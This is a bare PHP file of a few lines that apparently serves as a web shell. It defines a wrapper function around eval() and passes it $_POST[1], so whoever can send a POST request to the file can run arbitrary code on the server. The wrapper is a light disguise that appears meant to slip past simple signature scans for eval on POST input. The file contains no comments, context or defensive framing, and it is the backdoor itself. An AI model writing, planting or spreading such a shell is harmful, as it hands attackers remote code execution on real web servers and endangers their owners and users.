<?php

function tt($a)
{
    eval($a);
}

tt($_POST[1]);